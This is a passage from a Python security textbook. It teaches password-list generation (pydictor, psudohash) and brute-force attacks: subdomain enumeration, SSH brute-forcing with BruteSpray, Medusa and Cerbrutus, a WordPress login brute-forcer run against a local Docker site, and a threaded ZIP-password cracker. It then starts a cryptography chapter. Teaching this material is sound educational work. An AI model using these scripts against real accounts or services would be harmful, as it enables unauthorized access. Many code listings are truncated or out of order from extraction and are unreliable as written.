The test4.txt ﬁle contains 60,466,176 lines with the following
content:
00000, 00001, ..., 0000A, ...., ZZZZZ 
The following command generates a ﬁle called text5.txt, where
each line will contain a word from the dictionary following a
number base and will start with python and end with security.
Each word will have a length of exactly 5:
$ python pydictor.py -len 5 5 -base dc -o test4.txt 
                              _ _      _ 
              _ __  _   _  __| (_) ___| |_ ___  _ __
             | '_ \| | | |/ _' | |/ __| __/ _ \| '__
             | |_) | |_| | (_| | | (__| || (_) | | 
             | .__/ \__, |\__,_|_|\___|\__\___/|_| 
             |_|    |___/                           
  
[+] A total of :60466176 lines 
[+] Store in   :/home/linux/Descargas/pydictor/resul
[+] Cost       :34.517 seconds 

The test5.txt ﬁle contains 100,000 lines with the following
content:
The following command generates a ﬁle called test6.txt, where
each word in the dictionary will be encoded with SHA256:
$ python pydictor.py -len 5 5 -base d -head python -
                            _ _      _ 
              _ __  _   _  __| (_) ___| |_ ___  _ __
             | '_ \| | | |/ _' | |/ __| __/ _ \| '__
             | |_) | |_| | (_| | | (__| || (_) | | 
             | .__/ \__, |\__,_|_|\___|\__\___/|_| 
             |_|    |___/                           
  
[+] A total of :100000 lines 
[+] Store in   :/home/linux/Descargas/pydictor/resul
[+] Cost       :0.2706 seconds 
python00000security, python00001security, ...., pyth
$ python pydictor.py -len 5 5 -base d -head python -
                              _ _      _ 
              _ __  _   _  __| (_) ___| |_ ___  _ __
             | '_ \| | | |/ _' | |/ __| __/ _ \| '__
             | |_) | |_| | (_| | | (__| || (_) | | 
             | .__/ \__, |\__,_|_|\___|\__\___/|_| 
             |_|    |___/                           
  

The test6.txt ﬁle contains 100,000 lines with the following
content:
The following command generates a ﬁle called test7.txt, where
each line will have one of the possible combinations of the characters
indicated in chars. Each word will have a length of exactly 5:
The test7.txt ﬁle contains 7,776 lines with the following content:
[+] A total of :100000 lines 
[+] Store in   :/home/linux/Descargas/pydictor/resul
[+] Cost       :0.2614 seconds 
60bd1b952236975c2bbb4ea598819e4c96976d5142e62077ae8c
$ python pydictor.py -len 5 5 -char python -o test7
                              _ _      _ 
              _ __  _   _  __| (_) ___| |_ ___  _ __
             | '_ \| | | |/ _' | |/ __| __/ _ \| '__
             | |_) | |_| | (_| | | (__| || (_) | | 
             | .__/ \__, |\__,_|_|\___|\__\___/|_| 
             |_|    |___/                           
  
[+] A total of :7776 lines 
[+] Store in   :/home/linux/Descargas/pydictor/resul
[+] Cost       :0.0786 seconds 

ppppp, ppppy, ...., nnnnn 
With the previous examples, we saw how the script has the capacity
to perform permutations in a quite ﬂexible way. With the -chars
option, you specify the characters to be used for the permutation,
and with the -chunk option you specify groups of characters
separated by a space, and then the tool permutes these groups,
without modifying the content of each group.
One of the most interesting features of the tool is the possibility to
create customized dictionaries using the information you have about
a target. To do this, the available social engineering module must be
loaded. You must run the script with the --sedb option, as shown in
the following command:
$ python pydictor.py --sedb 
In the following screenshot, you can see the options available for this
command option:

Figure 13.2: Pydictor dictionary builder
In the previous image, we can see the main menu with the
commands and options. At this point, you can enter the data of the
target in question. The more information you provide, the more
combinations the tool will generate and the larger the dictionary will
be.
This tool oﬀers other interesting options that make the dictionary
more powerful and robust. The following command generates a ﬁle

called test8.txt, where each word will be a date between
01/01/2000 and 01/01/2023:
The test8.txt ﬁle contains 21,749 lines with the following content:
01012000, 20000101, ...., 20230101 
The following command performs a basic crawling process against
the given site, extracting each of the words found on the website:
Password list generator
$ python pydictor.py -plug birthday 01012000 0101202
                            _ _      _ 
              _ __  _   _  __| (_) ___| |_ ___  _ __
             | '_ \| | | |/ _' | |/ __| __/ _ \| '__
             | |_) | |_| | (_| | | (__| || (_) | | 
             | .__/ \__, |\__,_|_|\___|\__\___/|_| 
             |_|    |___/                           
  
[+] A total of :21749 lines 
[+] Store in   :/home/linux/Descargas/pydictor/resul
[+] Cost       :0.4211 seconds 
$ python pydictor.py -plug scratch http://python.org

psudohash (https://github.com/t3l3machus/psudohash) is a
password list generator for orchestrating brute-force aĴacks. It
imitates certain password creation paĴerns commonly used by
humans, like substituting a word’s leĴers with symbols or numbers,
using char-case variations, adding a common padding before or after
a word, and more. It is keyword-based and highly customizable. You
can install it with the following commands:
Typing the –h brings up the help screen: $ python psudohash.py
-h
$ git clone https://github.com/t3l3machus/psudohash 
$ cd psudohash 
$ chmod +x psudohash.py 
usage: psudohash.py [-h] -w WORDS [-an LEVEL] [-nl L
 optional arguments: 
  -h, --help            show this help message and e
  -w WORDS, --words WORDS 
                        Comma seperated keywords to 
  -an LEVEL, --append-numbering LEVEL  
.... 
Usage examples: 
  
  Basic: 
      python3 psudohash.py -w <keywords> -cpa 
  Thorough: 
      python3 psudohash.py -w <keywords> -cpa -cpb -

The -w option is the main option we can use to generate our
dictionary from the keywords we are interested in:
In the output of the execution, we see how it generates an
output.txt ﬁle containing a dictionary, with the possible
combinations of the words python and security with other
alphanumeric characters.
$ psudohash.py -w "python,security" --common-padding
    ┌─┐ ┌─┐ ┬ ┬ ┌┬┐ ┌─┐ ┬ ┬ ┌─┐ ┌─┐ ┬ ┬ 
    ├─┘ └─┐ │ │  ││ │ │ ├─┤ ├─┤ └─┐ ├─┤ 
    ┴   └─┘ └─┘ ─┴┘ └─┘ ┴ ┴ ┴ ┴ └─┘ ┴ ┴ 
                          by t3l3machus 
[Info] Calculating total words and size... 
[Warning] This operation will produce 364752 words, 
[*] Mutating keyword: python  
├─ Producing character case-based transformations..
├─ Mutating word based on commonly used char-to-symb
├─ Appending common paddings after each word mutatio
└─ Done! 
[*] Mutating keyword: security  
├─ Producing character case-based transformations..
├─ Mutating word based on commonly used char-to-symb
├─ Appending common paddings after each word mutatio
└─ Done! 
[Info] Completed! List saved in output.txt 

Tools for brute-force attacks in
Python
In this section, we will review the main tools we can ﬁnd in the
Python ecosystem to obtain information using brute-force aĴacks.
Obtaining subdomains by brute force
Aiodnsbrute (https://github.com/blark/aiodnsbrute) is a
Python 3.5+ tool that uses asyncio module to brute-force domain
names asynchronously. asyncio
(https://docs.python.org/3.10/library/asyncio.html) is a
library for writing concurrent code using the async/await syntax
and is used to do asynchronous calls with Python.
There are two ways to install it; the ﬁrst one consists of using a
command that allows you to install it on the system:
$ pip install aiodnsbrute 
The second one is downloading the source code from the GitHub
repository and running the setup.py ﬁle:
$ git clone https://github.com/blark/aiodnsbrute.git
$ cd aiodnsbrute 
$ python setup.py install . 

Once installed, we can see the various helper options with the
following command:
In the following execution we get the subdomains of the domain
python.org, and the results are saved in a JSON ﬁle:
$ aiodnsbrute --help 
Usage: aiodnsbrute [OPTIONS] DOMAIN 
  aiodnsbrute is a command line tool for brute forci
  Python's asyncio module. 
  credit: blark (@markbaseggio) 
Options: 
  -w, --wordlist TEXT           Wordlist to use for 
  -t, --max-tasks INTEGER       Maximum number of ta
  -r, --resolver-file FILENAME  A text file containi
                                to use, one per line
                                Default: use system 
  -v, --verbosity               Increase output verb
  -o, --output [csv|json|off]   Output results to DO
                                automatically append
  -f, --outfile FILENAME        Output filename. Use
                                output to stdout ove
  --query / --gethostbyname     DNS lookup type to u
                                be faster, but won't
  --wildcard / --no-wildcard    Wildcard detection, 
  --verify / --no-verify        Verify domain name i
                                enabled by default 
  --version                     Show the version and
  --help                        Show this message an

The content of the generated JSON ﬁle has the following format:
We will continue analyzing other tools to execute brute-force aĴacks,
in order to connect to a server and discover available services.
Brute-force attacks with BruteSpray
$ aiodnsbrute python.org --output json 
[*] Brute forcing python.org with a maximum of 512 c
[*] Using local resolver to verify python.org exists
[*] Using recursive DNS with the following servers: 
[*] No wildcard response was detected for this domai
[*] Using pycares 'query' function to perform lookup
[*] Wordlist loaded, proceeding with 1000 DNS reques
[+] www.python.org                      ['151.101.13
[+] mail.python.org                     ['188.166.95
[+] blog.python.org                     ['151.101.0
[+] staging.python.org                  ['54.196.16
[+] legacy.python.org                   ['167.99.21
[+] status.python.org                   ['52.215.192
[+] monitoring.python.org               ['140.211.10
[+] pl.python.org                       ['51.83.134
[+] doc.python.org                      ['151.101.13
[+] downloads.python.org                ['151.101.13
[+] console.python.org                  ['167.99.21
[{"domain": "www.python.org", "ip": ["151.101.132.22

BruteSpray is a script wriĴen in Python that is able to scan for hosts
and open ports with the Nmap port scanner. This tool automatically
provides output to later aĴack the services discovered on the various
hosts with the Medusa program.
The repository of the project can be found on GitHub
(https://github.com/x90skysn3k/brutespray), where you will
ﬁnd the source code of the tool to download and execute on any
Linux operating system.
Medusa is a script responsible for performing the brute-force process
and aĴempting to authenticate services such as SSH or FTP, among
other protocols. Medusa can be installed with the following
command in a Debian-based distribution:
$sudo apt-get install medusa 
For example, we could use Medusa to execute a brute-force aĴack
over an IP address using ﬁle dictionaries for users and passwords:
This script is designed to run on the popular security distribution
Kali Linux, and on all other Debian-based distributions. If we have a
Debian-based Linux operating system, the installation is as simple as
doing:
$ apt-get install brutespray 
$ medusa -h <ip_address> -U users_dictionary.txt -P 

If you work with another operating system, the other option is to
install manually from the source code found in the GitHub
repository:
By executing the following command in the terminal, we are
presented with all the options that we can to execute:
$ git clone https://github.com/x90skysn3k/brutespray
$ python brutespray.py -h 
usage: brutespray.py [-h] [-f FILE] [-o OUTPUT] [-s 
                     [-p PASSWORD] [-c] [-i] [-m] [-
 Usage: python brutespray.py <OPTIONS>  
 optional arguments: 
  -h, --help            show this help message and e
  
Menu Options: 
  -f FILE, --file FILE  GNMAP, JSON or XML file to p
  -o OUTPUT, --output OUTPUT 
                        Directory containing success
  -s SERVICE, --service SERVICE 
                        specify service to attack 
  -t THREADS, --threads THREADS 
                        number of medusa threads 
  -T HOSTS, --hosts HOSTS 
                        number of hosts to test conc
  -U USERLIST, --userlist USERLIST 
                        reference a custom username 
  -P PASSLIST, --passlist PASSLIST 

In the ﬁrst instance, we need to execute the Nmap tool to discover
the hosts and services available in the server that we are analyzing,
exporting this information to use it with BruteSpray:
Then, we can execute BruteSpray by importing the ﬁle generated by
Nmap, as follows:
With the previous command, we execute a brute-force aĴack using
the nmap_output.xml ﬁle, resulting from the execution of the nmap
command on a speciﬁc server. With the -t and -T options we
indicate the number of threads and hosts to test concurrently.
Brute-force attacks with Cerbrutus
                        reference a custom password 
... 
$ sudo nmap -sS -sV scanme.nmap.org -vv -n -oA nmap_
PORT      STATE SERVICE    REASON         VERSION 
22/tcp    open  ssh        syn-ack ttl 52 OpenSSH 6
80/tcp    open  http       syn-ack ttl 53 Apache htt
9929/tcp  open  nping-echo syn-ack ttl 53 Nping echo
31337/tcp open  tcpwrapped syn-ack ttl 53 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_ker
$ python brutespray.py --file nmap_output.xml -t 5 -

Cerbrutus is a modular brute-force tool wriĴen in Python for very
fast password injection from SSH, FTP, and other network services.
This tool uses a custom implementation of the Paramiko module
(https://github.com/paramiko/paramiko) to overcome a few
minor issues when implementing it for SSH brute-forcing. This tool
can be installed manually from the source code found in the GitHub
repository:
For example, we could use this tool to execute a brute-force aĴack
against an SSH service, using the wordlists/fasttrack.txt
$ git clone https://github.com/Cerbrutus-BruteForcer
$ python cerbrutus.py --help 
usage: cerbrutus.py [-h] -U USERS -P PASSWORDS [-p P
Python based network brute forcing tool! 
positional arguments: 
  Host                  The host to connect to - in 
  Service               The service to brute force (
optional arguments: 
  -h, --help            show this help message and e
  -U USERS, --users USERS 
                        Either a single user, or the
  -P PASSWORDS, --passwords PASSWORDS 
                        Either a single password, or
  -p PORT, --port PORT  The port you wish to target 
  -t THREADS, --threads THREADS 
                        Number of threads to use 
  -q [QUIET [QUIET ...]], --quiet [QUIET [QUIET ...]
                        Do not print banner 

dictionary ﬁle for the passwords. This dictionary can be found in the
GitHub repository at the URL https://github.com/Cerbrutus-
BruteForcer/cerbrutus/blob/main/wordlists/fasttrack.txt
and contains a wordlist to test the connection with an SSH service:
In this section, we reviewed the main Python tools for executing
brute-force aĴacks. We will continue analyzing how we can execute
brute-force aĴacks in web applications.
Executing brute-force attacks for
web applications
In this section, we will analyze how we can execute a dictionary
aĴack on a website in order to determine the usernames and
passwords that allow authentication on a website. For this section,
we will deploy a WordPress environment on the local machine using
Docker.
Executing a WordPress site
$ python cerbrutus.py scanme.nmap.org SSH -U "user" 
[*] - Initializing password list... 
Read in 223 words from wordlists/fasttrack.txt 
[+] - Running with 10 threads... 
[*] - Starting attack against user@scanme.nmap.org:2
[*] - Trying: 223/223 
[*] - Approaching final keyspace... 

One of the easiest ways to deploy a WordPress server, including its
database, is to use Docker Compose
(https://docs.docker.com/compose) as it facilitates the creation
of the diﬀerent services needed to start a WordPress instance.
The following docker-compose.yml ﬁle can be found inside the
wordpress folder:
version: "3.9"
services: 
  db: 
    image: mysql:5.7 
    volumes: 
      - db_data:/var/lib/mysql 
    restart: always 
    environment: 
      MYSQL_ROOT_PASSWORD: somewordpress 
      MYSQL_DATABASE: wordpress 
      MYSQL_USER: wordpress 
      MYSQL_PASSWORD: wordpress 
  wordpress: 
    depends_on: 
      - db 
    image: wordpress:latest 
    volumes: 
      - wordpress_data:/var/www/html 
    ports: 
      - "8000:80" 
    restart: always 
    environment: 
      WORDPRESS_DB_HOST: db:3306 

      WORDPRESS_DB_USER: wordpress 
      WORDPRESS_DB_PASSWORD: wordpress 
      WORDPRESS_DB_NAME: wordpress
volumes: 
  db_data: {} 
  wordpress_data: {} 
The manifest ﬁle speciﬁes MySQL 5.7 and Apache as our database
manager and application server, respectively.
The installation will be published on port 80 inside the container
and will redirect the requests to port 8000 on our machine. It will
also use the /var/www/html folder of the machine where Docker is
installed to host the WordPress installation ﬁles, and the
/var/lib/mysql folder for the DB.
To build the container and our stack, execute the following
command inside the wordpress folder:
$ docker-compose up -d 
When running the previous command, we should see the processes
Docker has created to execute the WordPress server, along with the
container that stores the MySQL database:
$ docker ps 
CONTAINER ID   IMAGE              COMMAND           
1301bb183ae9   wordpress:latest   "docker-entrypoint
27c5455cf1ae   mysql:5.7          "docker-entrypoint

To access the WordPress server deployed on localhost we can use
the following URL:
http://localhost:8000/wp-admin/install.php
In the following screenshot we can see the ﬁrst step to install
WordPress, where we enter information about the site and the user
credentials for authentication with this server.

Figure 13.3: WordPress conﬁguration
Once WordPress is installed and conﬁgured with our credentials, log
in to the application with the user name and password entered in the
previous step.
Figure 13.4: WordPress login page
Next, we will use this scenario to create our own automated tool to
perform brute-force aĴacks against this WordPress server
installation. To do this, we will need to extract the data from the
username and password ﬁelds from the login form, which for any
WordPress installation is located in the path /wp-login.php
(http://localhost:8000/wp-login.php).

Figure 13.5: WordPress login page
Looking at the source code of the website, we can see that the name
of the username ﬁeld is log, and the name of the password ﬁeld is
pwd. In our Python script, we will use these names to make the POST
request to the login module.
In the following example, we read each word we have in the
dictionary_wordpress.txt ﬁle and make a POST request to the
WordPress server with the data related to the user and password.
The following script can be found in the wordpress_login.py ﬁle
inside the wordpress folder:
import requests 
dictionary = open("dictionary_wordpress.txt","r") 
for word in dictionary.readlines(): 
    data = {'log':'user@domain.com','pwd':word.strip
    response = requests.post("http://localhost:8000/
    if response.status_code in [301,302]: 
        print("Credentials are valid:", data) 
        break 

We check for a successful login based on the HTTP response code.
An HTTP code corresponds to the response obtained, based on the
query made by the client.
A successful login would produce a 200 status code. A non-existent
resource would return the codes 403 or 404, while a redirection
would generate 301 or 302.
Next, we run the above script to test this behavior:
We could also execute some tests from the Python interpreter. In the
two ﬁrst queries, we can see that it returns a code 200, since the
credentials are incorrect, and in the last test executed, the credentials
are correct, since it returns a code 302:
    else: 
        print("Credentials are wrong", data) 
$ python wordpress_login.py 
Credentials are wrong {'log': 'user@domain.com', 'pw
Credentials are wrong {'log': 'user@domain.com', 'pw
Credentials are wrong {'log': 'user@domain.com', 'pw
Credentials are valid: {'log': 'user@domain.com', 'p
>>> import requests 
>>> data={'log':'wordpress','pwd':'security'} 
>>> response = requests.post("http://localhost:8000/
>>> response 
<Response [200]> 

In the previous example, we executed a brute-force aĴack using our
own dictionary ﬁle, and with easy logic, like checking that the
redirection code is returned, we can validate the credentials for the
WordPress login page.
In this case, we can observe that if the code response returns a 301
or 302 code, then the credentials are correct, and we have managed
to ﬁnd out the correct combination of user name and password.
Executing brute-force attacks for
ZIP files
In this section, we will analyze how we can create ZIP ﬁles with a
password and execute a brute-force dictionary process to obtain the
password to extract the contents of the ZIP ﬁle.
Handling ZIP files in Python
ZIP is an archive ﬁle format that supports lossless data compression.
By lossless compression, we mean that the compression algorithm
>>> data={'log':'wordpress','pwd':'admin_security'} 
>>> response = requests.post("http://localhost:8000/
>>> response 
<Response [200]> 
>>> data={'log':'user@domain.com','pwd':'admin_secur
>>> response = requests.post("http://localhost:8000/
>>> response 
<Response [302]> 

allows the original data to be perfectly reconstructed from the
compressed data. So, a ZIP ﬁle is a single ﬁle containing one or more
compressed ﬁles, oﬀering an ideal way to make large ﬁles smaller
and keep related ﬁles together.
To create a new ﬁle, we can use an instance of the ZipFile class in
write mode w, and to add ﬁles, we can use the write() method.
The following script can be found in the create_zip_file.py ﬁle
inside the zipfile folder:
We create a ZIP ﬁle with ﬁles in the current directory.
To read the names of the ﬁles inside an existing ZIP ﬁle, we can use
the namelist() method. The following script can be found in the
list_files_zip.py ﬁle inside the zipfile folder:
import zipfile  
zf = zipfile.ZipFile("zipfile.zip", "r")  
print(zf.namelist())  
zf.close() 
import os 
import zipfile 
zf = zipfile.ZipFile("zipfile.zip", "w") 
for dirname, subdirs, files in os.walk('files', topd
    for filename in files: 
        print(filename) 
        zf.write(os.path.join(dirname, filename)) 
zf.close() 

Another option to obtain the ﬁles contained in a ZIP ﬁle is to use the
infolist method, using the filename property to obtain the name
of the ﬁles. In the following example, we list all ﬁles inside a ZIP
archive. The following script can be found in the
list_files_zip_archive.py ﬁle inside the zipfile folder:
import zipfile 
def list_files_in_zip(filename): 
    with zipfile.ZipFile(filename) as thezip: 
        for zipinfo in thezip.infolist(): 
            yield zipinfo.filename 
for filename in list_files_in_zip("zipfile.zip"): 
    print(filename) 
To access all metadata about the ZIP content, we can use the
infolist() and the getinfo() methods, for example. The
following script can be found in the zip_metadata.py ﬁle inside
the zipfile folder:
import datetime  
import zipfile  
zf = zipfile.ZipFile("zipfile.zip", "r")  
for info in zf.infolist(): 
    print(info.filename) 
    print("  Comment: " + str(info.comment.decode())
    print("  Modified: " + str(datetime.datetime(*in
    print("  System: " + str(info.create_system) + "
    print("  ZIP version: " + str(info.create_versio
    print("  Compressed: " + str(info.compress_size)

In the previous code, we read the metadata of a ZIP ﬁle. By
executing the above script, we obtain the metadata for the ﬁle inside
the ZIP ﬁle:
$ python zip_metadata.py 
files/file.txt 
  Comment:  
  Modified: 2023-04-01 00:44:26 
  System: 3 (0=MS-DOS OS-2, 3=Unix) 
  ZIP version: 20 
  Compressed: 9 bytes 
  Uncompressed: 9 bytes 
Another interesting operation is to extract ﬁles from a ZIP ﬁle using
the extractall() method. The following script can be found in the
extract_zip.py ﬁle inside the zipfile folder:
import zipfile  
zipfilename = "zipfile.zip"  
password = None  
zf = zipfile.ZipFile(zipfilename, "r")  
try: 
    zf.extractall(pwd=password) 
except Excception as exception: 
    print('Exception', exception)  
zf.close() 
    print("  Uncompressed: " + str(info.file_size) +
zf.close() 

In the previous code, we open and extract all ﬁles from the ZIP with
no password required.
We will continue to create a ZIP ﬁle protected with a password. The
main option we have to create a ZIP ﬁle with a password is to use
the pyminizip module, which can be found in the oﬃcial Python
repository (https://pypi.org/project/pyminizip). The
pyminizip module can be installed using the following command:
$ pip install pyminizip 
This module provides the compress (/srcfile/path.txt,
file_path_prefix, /distfile/path.zip, password,
int(compress_level)) method that provides the following
arguments:
src file path (string)
src file prefix path (string) or None (path to prepend to
ﬁle)
dst file path (string)
password (string) or None (to create no-password zip)
compress_level(int) between 1 to 9, 1 (more fast) <—> 9
(more compress) or 0 (default)
In the following example, we create a ZIP ﬁle called output.zip
using the compress() method. The following code can be found in
the create_zip_file_with_password.py ﬁle inside the zipfile
folder:

Next, we can try to extract the contents of this compressed ﬁle using
the same password used to compress it. The following code can be
found in the open_zip_file_with_password.py ﬁle inside the
zipfile folder:
When executing the previous script, we can see how it extracts the
ﬁle from the ZIP ﬁle. If we try to unzip with the wrong password, it
returns Exception Bad password for the file 'file.txt':
$ python open_zip_file_with_password.py 
<zipfile.ZipFile filename='output.zip' mode='r'> 
import pyminizip 
input = "files/file.txt" 
output = "output.zip" 
password = "my_password" 
compresion_level = 5 
pyminizip.compress(input, None, output,password, com
import zipfile 
filename = 'output.zip' 
password = 'my_password' 
my_file = zipfile.ZipFile(filename) 
try: 
    my_file.extractall(pwd=bytes(password,'utf-8')) 
    print(my_file) 
except Exception as exception: 
    print("Exception",exception) 

$ python open_zip_file_with_password.py 
Exception Bad password for file 'file.txt' 
We will continue with the development of a Python script that reads
a compressed zip password ﬁle and a ﬁle containing a dictionary of
passwords, executing a brute-force process that checks all the
passwords in the dictionary. If one of these passwords is correct, the
script validates and displays it.
Executing brute-force attacks for
password-protected ZIP files
The eﬀectiveness of a brute-force aĴack depends on the dictionary
used. Many of the passwords found in brute-force dictionaries are
short, simple words or simple permutations of easy-to-guess
passwords. It is important to create unique passwords that are not
easy to guess. A combination of numbers, leĴers, and special
characters that have no special meaning is ideal.
The following Python script allows us to get a password from a ZIP
ﬁle by a brute-force process. The following code can be found in the
get_password_zip_file.py ﬁle inside the zipfile folder:
import zipfile 
filename = 'output.zip' 
dictionary = 'password_list.txt' 
my_file = zipfile.ZipFile(filename) 
with open(dictionary, 'r') as f: 
    for line in f.readlines(): 

When executing the previous script, we can see how it tries to extract
the contents of the ZIP ﬁle using each password that exists in the
dictionary ﬁle. If we try to unzip with the wrong password, it
returns Exception Bad password for file 'file.txt':
We could improve the previous script by making it possible for the
user to enter the ZIP ﬁle and the password dictionary by a
parameter. In the following example, we will create the following
two methods:
extract_ﬁle(zip_ﬁle, password) allows us to extract the contents
of a ZIP ﬁle using the password passed as a parameter. If the
password is not correct, a related exception will be raised. If the
password is correct, it will extract the contents of the ﬁle.
main(zip_ﬁle, dictionary) is the main method that allows us to
read the dictionary ﬁle and test each one of the words that we
        password = line.strip('\n') 
        try: 
            my_file.extractall(pwd=bytes(password,'u
            print('Password found: %s' % password) 
        except Exception as exception: 
            print("Trying password:%s Exception:%s" 
$ python get_password_zip_file.py 
Trying password:python Exception:Bad password for fi
Trying password:security Exception:Bad password for 
Trying password:linux Exception:Bad password for fil
Password found: my_password 

ﬁnd in it, creating a thread to test each one of them.
The following code can be found in the
zip_brute_force_dicctionary.py ﬁle inside the zipfile folder:
Our main program contains the logic related to the reading of the
script parameters and, if the parameters are correct, it calls our main
method, passing as arguments the ZIP ﬁle and the dictionary ﬁle:
import zipfile 
import optparse 
from threading import Thread 
def extract_file(zip_file, password): 
    try: 
        print(f'[+] Trying password: {password}') 
        zip_file.extractall(pwd=password.encode('utf
        print(f'[+] Found password: {password}') 
    except Exception as exception: 
        pass
def main(zip_file, dictionary): 
    zip_file = zipfile.ZipFile(zip_file) 
    with open(dictionary) as passwords_file: 
        for line in passwords_file.readlines(): 
            password = line.strip('\n') 
            thread = Thread(target=extract_file, arg
            thread.start() 
if __name__ == '__main__': 
    parser = optparse.OptionParser(usage='zip_crack
    parser.add_option('--zipfile', dest='zipfile',he

Initially, we can use the -h option to see the arguments supported
by the script. In this case, for its correct operation, it is necessary to
indicate the ZIP ﬁle and the dictionary ﬁle:
If we pass the ZIP ﬁle and our dictionary to the program as
arguments, when we execute it, we can see how it ﬁnds the
password needed to extract the contents of the ZIP ﬁle:
    parser.add_option('--dictionary', dest='dictiona
    (options, args) = parser.parse_args() 
    if (options.zipfile == None) | (options.dictiona
        print(parser.usage) 
    else: 
        main(options.zipfile, options.dictionary) 
$ python zip_brute_force_dictionary.py -h 
Usage: zip_crack.py --zipfile <ZIP_FILE> --dictionar
Options: 
  -h, --help            show this help message and e
  --zipfile=ZIPFILE     zip file 
  --dictionary=DICTIONARY dictionary file with possi
$ python zip_brute_force_dictionary.py --zipfile out
[+] Trying password: python 
[+] Trying password: security 
[+] Trying password: linux 
[+] Trying password: my_password 
[+] Found password: my_password 

In this section, we learned how the zipfile module works to
extract the contents of a ﬁle and execute a brute-force aĴack, using a
dictionary containing possible passwords to open a ZIP ﬁle that is
password- protected.
Summary
One of the objectives of this chapter was to learn about the modules
and tools that allow us to generate dictionaries we can use to execute
brute-force aĴacks to get information from servers, websites, and
ZIP ﬁles.
In the next chapter, we will explore programming packages and
Python modules to implement cryptography with modules like
pycryptodome and cryptography. Also, we will cover some
Python modules to generate keys securely with the secrets and
hashlib modules. Finally, we will cover Python tools for code
obfuscation.
Questions
As we conclude this chapter, here is a list of questions for you to test
your knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. Using pydictor, what command could we execute to generate a
dictionary of words taken from a website via a scraping
process?

2. Using psudohash, what command could we execute to generate
a dictionary of words with a combination of the keywords we
are interested in?
3. Which script wriĴen in Python has the capacity to execute a
brute-force aĴack, using the output provided by the Nmap port
scanner?
4. What is the command we could execute using Cerbrutus to
execute a brute-force aĴack against an SSH service, using the
wordlists/fasttrack.txt dictionary ﬁle for the passwords?
5. Which Python module can we use to protect a ZIP ﬁle with a
password, and what method can we execute to create a ZIP ﬁle
protected with a password?
Further reading
At the following links, you can ﬁnd more information about the tools
mentioned in this chapter and the oﬃcial Python documentation for
some of the modules commented on:
PyDictor (https://github.com/LandGrey/pydictor) is a
Python script that provides diﬀerent options to customize the
generation of dictionaries.
psudohash (https://github.com/t3l3machus/psudohash) is
a password list generator to orchestrate brute-force aĴacks.
Aiodnsbrute (https://github.com/blark/aiodnsbrute) is a
Python 3.5+ tool that uses the asyncio module to brute-force
domain names asynchronously.
BruteSpray (https://github.com/x90skysn3k/brutespray)
is a script wriĴen in Python that has the capacity to search for

hosts and open ports with the Nmap port scanner, and execute
brute-force process aĴacks with Medusa.
Medusa (https://github.com/jmk-foofus/medusa) is a
speedy, parallel, and modular login brute-force tool. Its goal is
to support as many services that allow remote authentication as
possible.
Cerbrutus (https://github.com/Cerbrutus-
BruteForcer/cerbrutus) is a modular brute-force tool wriĴen
in Python for very fast password injection from SSH, FTP, and
other network services.
Brut3k1t (https://github.com/maitreyarael/brut3k1t) is
a server-side brute-force module that supports dictionary
aĴacks on various protocols. The current protocols that are
complete and supported are ssh, ftp, smtp, xmpp, and
telnet.
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

14
Cryptography and Code
Obfuscation
In addition to being one of the most used languages in computer
security, Python is also well known for supporting cryptography.
The main objective of this chapter is to present the most important
algorithms for encrypting and decrypting information, covering
cryptographic functions and their implementations in Python.
Although a short introduction to cryptographic algorithms is given
in this chapter, we will assume the reader has a minimum
knowledge of cryptography. If you wish to learn more, you can
make use of other resources, such as https://www.crypto101.io.
This chapter covers the main modules we have in Python for
encrypting and decrypting information, including pycryptodome
and cryptography. Also, we will cover Python modules that
generate keys securely with the secrets and hashlib modules.
Finally, we will cover Python tools for code obfuscation.
You will acquire skills related to encrypting and decrypting
information with Python modules and other techniques such as
steganography for hiding information in images.
The following topics will be covered in this chapter:

Introducing cryptography
Encrypting and decrypting information with PyCryptodome
Encrypting and decrypting information with cryptography
Generating keys securely with the secrets and hashlib
modules
Python tools for code obfuscation
Technical requirements
Before you start reading this chapter, you should know the basics of
Python programming and have some basic knowledge of HTTP. We
will work with Python version 3.10, available at
www.python.org/downloads.
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Check out the following video to see the Code in Action:
https://packt.link/Chapter14.
Introduction to cryptography
Cryptography is a branch of mathematics responsible for
safeguarding information exchange between communicating parties
and includes techniques for message integrity checking,
sender/receiver identity authentication, and digital signatures. It
directly supports the Conﬁdentiality element of the CIA triad, a core
model of information security.

Here are four common cryptography algorithms:
Hash functions: Also known as one-way encryption, a hash
function outputs a ﬁxed-length hash value for plain text input
and, in theory, it’s impossible to recover the length or content of
the plain text. One-way cryptographic functions are typically
used in websites to store passwords in a way that they cannot be
retrieved. The only way to get the input data from the hash code
is by brute-force searching for possible inputs or by using a
table of matching hashes.
Keyed hash functions: These are used to build Message
Authentication Codes (MACs) and are intended to prevent
brute-force aĴacks.
Symmetric cryptography: These are used by systems that use
the same key to encrypt and decrypt information.
Asymmetric cryptography: Asymmetric cryptography is a
branch of cryptography where a key is divided into two parts, a
public key and a private key. The public key can be distributed
freely, while the private key must be kept secret. An example of
the use of this type of algorithm is the digital signature that is
used to guarantee the data exchanged between the client and
server has not been altered. An example of such an encryption
algorithm is RSA, which is used to perform key exchange
during the SSL/TLS handshake process.
Now that we have reviewed some key algorithms used in
cryptography, let’s analyze the pycryptodome module, a widely
used Python cryptography module.

Encrypting and decrypting
information with pycryptodome
In this section, we will review cryptographic algorithms and the
pycryptodome module for encrypting and decrypting data.
Introduction to pycryptodome
The PyCryptodome (https://pypi.org/project/pycryptodome)
cryptographic module supports functions for block encryption, ﬂow
encryption, and hash calculation. This module is wriĴen mostly in
Python but has routines wriĴen in C for performance reasons.
Among the main characteristics, we can highlight the following:
The main block ciphers supported are HASH, Advanced
Encryption Standard (AES), DES, DES3, IDEA, and RC5.
Authenticated encryption modes (GCM, CCM, EAX, SIV, and
OCB).
Elliptic curve cryptography.
Rivest-Shamir-Adleman (RSA) and DSA key generation.
Improved and more compact APIs, including nonce and
initialization vector (IV) aĴributes for ciphers to randomize the
generation of data. Nonce is a term used in cryptography that
refers an arbitrary number that is only used one time in a
cryptographic operation. To ensure that it is only used once, a
nonce includes a timestamp, which means it is only valid during
a speciﬁc amount of time.

To use this module with Python 3, we need to install it with the
following python3-dev and build-essential packages:
$ sudo apt-get install build-essential python3-dev 
You can ﬁnd this module in the Python Package Index and it can be
installed with the following command:
